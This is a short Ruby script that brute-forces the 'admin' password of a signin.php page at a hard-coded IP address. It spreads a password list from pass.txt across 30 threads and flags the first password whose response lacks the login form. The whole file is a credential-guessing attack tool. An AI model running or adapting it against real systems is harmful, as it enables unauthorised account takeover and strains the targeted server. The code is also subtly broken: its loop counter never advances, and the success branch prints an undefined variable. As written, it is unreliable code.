require 'net/http'

uri = URI('http://70.32.34.131/signin.php')

file = File.open("pass.txt")

arry = []
file.each do |x|
	arry << x.strip
end


#puts arry.inspect
sum_size = arry.size

thread = []
thread_size = 30
thread_size.times do |i|
	thread << Thread.new do
		sx = sum_size / thread_size
		a = i*sx
		b = (i+1)*sx
		while a<b do
			params = { :username => "admin", :password => arry[a] }
			uri.query = URI.encode_www_form(params)
			res = Net::HTTP.get_response(uri)
			body = res.body if res.is_a?(Net::HTTPSuccess)
			if body.include?"exampleInputPassword1" 
				print '.'
			else
				puts "pass"+" "+x
				return
			end
		end		
	end

end

thread.each do |s|
	s.join
end
	




